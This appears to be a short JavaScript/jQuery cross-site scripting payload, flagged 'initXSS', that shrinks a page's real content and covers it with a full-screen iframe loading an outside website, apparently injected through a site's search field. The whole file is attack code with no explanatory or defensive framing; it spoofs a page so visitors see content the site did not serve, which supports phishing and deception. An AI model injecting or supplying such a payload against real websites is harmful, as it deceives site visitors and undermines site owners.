$(function() {
  var fakePageUrl = "https://www.4sellers.de";
  
  // Run only once
  if (window.initXSS) {
    return;
  }
  window.initXSS = true;
  
  // Notify
  console.log("hello console");

  // Clear the text box
  //$('[name=ctl17$tbSearch]')[0].value = '';
  
  // TODO: use an event for this
  // Replace with the fake page
  ReplaceWithFakePage();
  
  // Replaces current page with the fake page
  function ReplaceWithFakePage() {
    // make the original body very small
    document.body.style = 'height: 100px; width: 100px; overflow: hidden; float: left;';

    // Add the fake page iframe
    var iframe = document.createElement('iframe');
    iframe.style = "position: absolute; background-color: #fff; border: none; top: 0; left: 0; right: 0; bottom: 0; width: 100%; height: 100%; z-ndex:999999;";
    iframe.src = fakePageUrl;
    document.body.appendChild(iframe);
  }
});
